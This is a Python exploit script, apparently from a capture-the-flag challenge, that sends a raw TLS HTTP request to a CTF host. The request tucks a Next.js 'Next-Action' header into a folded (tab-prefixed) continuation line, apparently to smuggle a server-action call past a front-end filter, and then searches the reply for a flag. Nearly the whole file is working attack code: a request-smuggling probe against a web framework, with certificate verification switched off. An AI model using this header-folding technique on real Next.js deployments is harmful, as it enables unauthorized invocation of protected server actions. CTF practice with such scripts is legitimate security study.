#!/usr/bin/env python3
"""Test if folded Next-Action header reaches Node.js as a real action."""
import socket, ssl

HOST = "funicular-gm2cxozn.alfactf.ru"
PORT = 443
ACTION_ID = "40c6382106bb726484f31b3ebc21b7476819a1cccf"


def send(payload, label, save_to=None):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    s = socket.create_connection((HOST, PORT), timeout=20)
    s = ctx.wrap_socket(s, server_hostname=HOST)
    s.sendall(payload)
    chunks = []
    try:
        s.settimeout(15)
        while True:
            d = s.recv(8192)
            if not d:
                break
            chunks.append(d)
    except (TimeoutError, socket.timeout):
        pass
    finally:
        try: s.close()
        except: pass
    full = b"".join(chunks)
    head, _, body = full.partition(b"\r\n\r\n")
    print(f"\n=== {label} (status: {head.split(b' ',2)[1] if b' ' in head else b'?'}, body_len={len(body)}) ===")
    print(head[:500].decode("utf-8", "replace"))
    if save_to:
        with open(save_to, "wb") as f:
            f.write(full)
    snippet = body[:1000].decode("utf-8", "replace")
    if "alfa{" in snippet or "alfa{" in body.decode("utf-8","replace"):
        i = body.find(b"alfa{")
        print(">>> FLAG:", body[i:i+200].decode("utf-8", "replace"))
    if b'"restored":true' in body:
        print(">>> 'restored':true present")
    # Check for any RSC payload differences vs baseline
    print("body[:300]:", body[:300].decode("utf-8", "replace"))
    return full


# Test 1: Folded Next-Action with proper RSC body for fetch action
# The fetch-action body should be JSON array (no formData), encoded by encodeReply
fetch_body = b'[]'  # empty args
req = (
    f"POST / HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    f"X-Anything: filler\r\n"
    f"\tNext-Action: {ACTION_ID}\r\n"
    f"Content-Type: text/plain;charset=UTF-8\r\n"
    f"Accept: text/x-component\r\n"
    f"Content-Length: {len(fetch_body)}\r\n"
    f"Connection: close\r\n\r\n"
).encode() + fetch_body
send(req, "fetch action via folded header", save_to="/Users/airp0wer/Projects/alfa-ctf-2026/tasks-2026/funicular/artifacts/fetch_action_response.bin")
